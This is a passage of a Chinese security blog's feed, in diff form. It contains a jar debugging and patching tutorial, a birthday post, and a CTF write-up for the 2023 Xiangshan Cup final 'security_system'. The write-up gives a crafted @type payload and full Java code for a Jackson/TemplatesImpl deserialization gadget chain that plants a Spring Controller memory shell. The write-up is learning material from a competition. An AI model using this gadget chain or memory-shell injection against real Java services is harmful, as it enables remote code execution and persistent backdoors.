+</code></pre>
+<p>成功执行命令，后面执行/readflag即可<br>
+<img src="https://skyblu3519.github.io/post-images/1709264753744.png" alt="" loading="lazy"></p>
+<h2 id="ps">PS</h2>
+<p>首先在jar包里面调试，有些方法Find Usage找不出来。而且明明调用了这个方法，打断点也停不了。<br>
+<img src="https://skyblu3519.github.io/post-images/1709264770809.png" alt="" loading="lazy"></p>
+<p>但是直接追踪变量就可以了。具体也不知道什么原因……<br>
+<img src="https://skyblu3519.github.io/post-images/1709264779676.png" alt="" loading="lazy"></p>
+<p>还有就是生成动态连接库，这里的平台要保持统一。这里我整了个gcc+jdk8的docker来生成的</p>
+<pre><code># 基于 Ubuntu 镜像
+FROM ubuntu:latest
+
+# 更新软件包列表
+RUN apt-get update
+
+# 安装 OpenJDK-8-JDK
+RUN apt-get install -y openjdk-8-jdk
+
+# 安装 GCC
+RUN apt-get install -y gcc
+
+# 设置 JAVA_HOME 环境变量
+ENV JAVA_HOME /usr/lib/jvm/java-8-openjdk-arm64
+
+# 清理缓存以减小镜像大小
+RUN apt-get clean
+
+# 验证安装
+RUN java -version
+RUN gcc --version
+</code></pre>
+<h1 id="总结">总结</h1>
+<p>在各种摆烂后，这道去年10月的题到今天终于看完了……</p>
+<p>其中涉及的好多知识点也算慢慢学完了。RASP和JNI我应该是不打算再写篇博客了，以后遇到再说吧～</p>
+<p>RASP的参考链接：<a href="https://www.cnblogs.com/rickiyang/p/11368932.html">https://www.cnblogs.com/rickiyang/p/11368932.html</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[birthday gift]]></title>
+        <id>https://skyblu3519.github.io/post/birthday-gift/</id>
+        <link href="https://skyblu3519.github.io/post/birthday-gift/">
+        </link>
+        <updated>2024-02-02T04:46:11.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>垂直活着 水平留念着</p>
+</blockquote>
+<p>最好的生日礼物🎁<br>
+<img src="https://skyblu3519.github.io/post-images/1706897361525.jpg" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[JavaWeb之jar包Debug与Patch]]></title>
+        <id>https://skyblu3519.github.io/post/javaweb-zhi-jar-bao-debug-yu-patch/</id>
+        <link href="https://skyblu3519.github.io/post/javaweb-zhi-jar-bao-debug-yu-patch/">
+        </link>
+        <updated>2024-01-03T14:21:08.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="debug">Debug</h1>
+<p>新建一个项目将jar包复制进来。<br>
+<img src="https://skyblu3519.github.io/post-images/1704291836984.png" alt="" loading="lazy"></p>
+<p>修改web.jar为web.zip解压缩为web目录<br>
+<img src="https://skyblu3519.github.io/post-images/1704291842472.png" alt="" loading="lazy"></p>
+<p>选择 File -&gt; Project Structure... 将 web.jar，web目录下的BOOT-INF/classes、BOOT-INF/lib、org目录导入lib<br>
+<img src="https://skyblu3519.github.io/post-images/1704291847611.png" alt="" loading="lazy"></p>
+<p>新建一个web.jar的运行配置<br>
+<img src="https://skyblu3519.github.io/post-images/1704291875019.png" alt="" loading="lazy"></p>
+<p>右上角开启Debug，在jar包里面下断点就可以调试了<br>
+<img src="https://skyblu3519.github.io/post-images/1704291881006.png" alt="" loading="lazy"></p>
+<h1 id="patch">Patch</h1>
+<p>比如这里我要修复index.class里面的代码，首先新建一个与它一样的包结构<code>com.example.jackson</code><br>
+<img src="https://skyblu3519.github.io/post-images/1704291887342.png" alt="" loading="lazy"></p>
+<p>写好修复后的代码重新编译<br>
+<img src="https://skyblu3519.github.io/post-images/1704291918307.png" alt="" loading="lazy"></p>
+<p>在target目录下找到编译好的Index.class<br>
+<img src="https://skyblu3519.github.io/post-images/1704291923376.png" alt="" loading="lazy"></p>
+<p>打开winrar文件，用编译好后的class文件拖进去直接替换<br>
+<img src="https://skyblu3519.github.io/post-images/1704291928393.png" alt="" loading="lazy"></p>
+<p>将替换后的zip后缀改为jar，代码成功替换<br>
+<img src="https://skyblu3519.github.io/post-images/1704291953524.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[2023香山杯决赛]security_system]]></title>
+        <id>https://skyblu3519.github.io/post/2023-xiang-shan-bei-jue-sai-security_system/</id>
+        <link href="https://skyblu3519.github.io/post/2023-xiang-shan-bei-jue-sai-security_system/">
+        </link>
+        <updated>2023-12-30T17:40:18.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="题目环境">题目环境</h1>
+<p>感谢大头哥复现的环境🙏：<a href="https://mp.weixin.qq.com/s/nlTfCG6-9JAUT1ESMdH3Zg">[CTF复现计划]2023香山杯决赛 security system</a></p>
+<h1 id="题目分析">题目分析</h1>
+<p>反编译jar包，内容结构很简单，就一个<code>/safeobject</code>路由。</p>
+<pre><code class="language-java">@RequestMapping({&quot;/safeobject&quot;})
+public String start(String obj, String classes) throws Exception {
+    if (!classes.contains(&quot;Object&quot;) &amp;&amp; !classes.contains(&quot;LinkedHashMap&quot;)) {
+        Class c = Class.forName(classes);
+        SecurityCheck var10000 = isSafe;
+        if (SecurityCheck.isSafe()) {
+            Object o = SecurityCheck.deObject(mapper.readValue(obj, c));
+            return o.toString();
+        } else {
+            StringBuilder sb = new StringBuilder();
+            var10000 = isSafe;
+            Iterator var5 = SecurityCheck.ismap().iterator();
+
+            while(var5.hasNext()) {
+                Object item = var5.next();
+                byte[] s = SecurityCheck.base64Decode((String)item);
+                sb.append(SecurityCheck.deserialize(s));
+            }
+
+            return sb.toString();
+        }
+    } else {
+        return &quot;error&quot;;
+    }
+}
+</code></pre>
+<p>根据<code>mapper.readValue(obj, c)</code>的注释猜测，这是一个解析Json字符串的函数，第二个参数似乎是要转换的类型。根据后面的流程，这里应该是要将Json转为一个map类型的对象。</p>
+<p><code>SecurityCheck.deObject</code>操作的是<code>mapper.readValue(obj, c)</code>解析出的map，它会将map中<code>@type</code>所指的类实例化成一个对象，然后用map剩下的键值对来修改这个对象的属性，最后返回这个对象。</p>
+<pre><code class="language-java">public static Object deObject(Object ob) throws Exception {
+    if (ob instanceof LinkedHashMap) {
+        LinkedHashMap map = (LinkedHashMap)ob;
+        String type = (String)map.get(&quot;@type&quot;);
+        if (!&quot;&quot;.equals(type) &amp;&amp; type != null) {
+            Class clazz = Class.forName(type);
+            Object obj = clazz.newInstance();
+            Iterator ir = map.keySet().iterator();
+
+            while(ir.hasNext()) {
+                String key = (String)ir.next();
+                Object value = map.get(key);
+                if (!key.equals(&quot;@type&quot;)) {
+                    Field field = getField(clazz, key);
+                    if (field != null) {
+                        setFieldValues(obj, key, value);
+                    }
+                }
+            }
+
+            return obj;
+        } else {
+            return map;
+        }
+    } else {
+        return ob;
+    }
+}
+</code></pre>
+<p>�<br>
+注意到这个返回的对象在<code>start</code>中会直接调用它的<code>toString</code>方法，这里似乎可以直接衔接到JackSon反序列化的<code>POJONode</code>。但这里在实例化<code>clazz</code>的时候调用的是它的无参构造方法，而<code>POJONode</code>只有有参的，所以这个方法会在实例化<code>POJONode</code>的时候失败。</p>
+<p>这里要用else的部分打，<code>SecurityCheck.deObject()</code>也可以修改<code>SecurityCheck</code>中的静态变量。所以思路就很明确了</p>
+<ul>
+<li>第一次请求在 if 部分修改<code>SecurityCheck</code>的<code>safe</code>为<code>false</code>，<code>treeMap</code>包含恶意的反序列化字符串。</li>
+<li>第二次请求在 else 部分将<code>treeMap</code>中的内容取出触发反序列化。</li>
+</ul>
+<h1 id="解题流程">解题流程</h1>
+<p>因为classes不能为LinkedHashMap，所以选取一个LinkedHashMap的子类，这里选择的是<code>org.springframework.ui.ModelMap</code></p>
+<p>然后是<code>obj</code>的构造，唯一要思考的就是用来替换<code>treeMap</code>的值怎么写。虽然JSON用来表示Set的写法是<code>[&quot;content&quot;]</code>，但是这里只能被解析为ArrayList，无法被替换。</p>
+<p>注意到这里的<code>setFieldValues</code>的写法是</p>
+<pre><code class="language-java">public static void setFieldValues(Object obj, String fieldName, Object fieldValue) {
+    try {
+        setFieldValue(obj, fieldName, deObject(fieldValue));
+    } catch (Exception var4) {
+        System.out.println(var4);
+    }
+
+}
+</code></pre>
+<p>这里对修改的fieldValue又调用了一次<code>deObject</code>，有一点绕，不过这样让我们可以直接实例化一个HashSet来替换。另外，简单记一下Set中存储值的是一个map的Key，value可以不用管（感觉之前CC链好像见过...）<br>
+<img src="https://skyblu3519.github.io/post-images/1703959074081.png" alt="" loading="lazy"></p>
+<p>所以payload构造为</p>
+<pre><code>obj={&quot;@type&quot;:&quot;com.example.jackson.SecurityCheck&quot;,&quot;treeMap&quot;:{&quot;@type&quot;:&quot;java.util.HashSet&quot;,&quot;map&quot;:{&quot;反序列化的字符串&quot;:&quot;&quot;}},&quot;safe&quot;:false}&amp;classes=org.springframework.ui.ModelMap
+</code></pre>
+<p>反序列化的链子选择JackSon那条（稳定版），用它来打一个刚学到的Controller内存马</p>
+<pre><code class="language-java">package yso.json.Jackson;
+
+import com.fasterxml.jackson.databind.node.POJONode;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtMethod;
+import org.apache.commons.codec.binary.Base64;
+import org.springframework.aop.framework.AdvisedSupport;
+
+import javax.management.BadAttributeValueExpException;
+import javax.xml.transform.Templates;
+import java.io.*;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+
+public class Exp {
+    public static void main(String[] args) throws Exception{
+        byte[] bytecode = Files.readAllBytes(Paths.get(&quot;./target/classes/SpControllerExploit2.class&quot;));       // Evil bytecode
+        byte[][] bytecodes = {bytecode};
+        TemplatesImpl templates = TemplatesImpl.class.newInstance();
+        setValue(templates, &quot;_bytecodes&quot;, bytecodes);
+        setValue(templates, &quot;_name&quot;, &quot;xx&quot;);
+        setValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+
+        // 使用JdkDynamicAopProxy稳定调用
+        Class&lt;?&gt; clazz = Class.forName(&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;);
+        Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
+        cons.setAccessible(true);
+        AdvisedSupport advisedSupport = new AdvisedSupport();
+        advisedSupport.setTarget(templates);
+        InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);
+        Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler);
+
+        // 删除 jsonNode 的 writeReplace
+        try {
+            ClassPool _pool = ClassPool.getDefault();
+            CtClass jsonNode = _pool.get(&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;);
+            CtMethod writeReplace = jsonNode.getDeclaredMethod(&quot;writeReplace&quot;);
+            jsonNode.removeMethod(writeReplace);
+            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
+            jsonNode.toClass(classLoader, null);
+        } catch (Exception e) {
+        }
+
+        POJONode node = new POJONode(proxyObj);
+        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
+        Field valfield = val.getClass().getDeclaredField(&quot;val&quot;);
+        valfield.setAccessible(true);
+        valfield.set(val, node);
+
+        String s = serializeToBase64(val);
+        System.out.println(s);
+//        deserializeFromBase64(s);
+    }
+    public static void setValue(Object instance, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException {
+        Field field = instance.getClass().getDeclaredField(fieldName); // 获取私有字段
+        field.setAccessible(true);  // 设置为可访问
+        field.set(instance, value); // 为字段设置新值
+    }
+    public static Object deserializeFromBase64(String base64String) throws IOException, ClassNotFoundException {
+//        byte[] data = Base64.getDecoder().decode(base64String);
+        byte[] data = Base64.decodeBase64(base64String);
+        try (ByteArrayInputStream bais = new ByteArrayInputStream(data);
+             ObjectInputStream ois = new ObjectInputStream(bais)) {
+
+            return ois.readObject();
+        }
+    }
+
+    public static String serializeToBase64(Object obj) throws IOException {
+        try (ByteArrayOutputStream baos = new ByteArrayOutputStream();
+             ObjectOutputStream oos = new ObjectOutputStream(baos)) {
+
+            oos.writeObject(obj);
+            oos.flush();
+
+//            return Base64.getEncoder().encodeToString(baos.toByteArray());
+            return org.apache.commons.codec.binary.Base64.encodeBase64String(baos.toByteArray());
+        }
+    }
+}
+</code></pre>
+<p>读取flag~<br>
+<img src="https://skyblu3519.github.io/post-images/1703959089265.png" alt="" loading="lazy"></p>
+<h1 id="修复">修复</h1>
+<p>过滤一下@type</p>
+]]></content>
+    </entry>
+</feed>
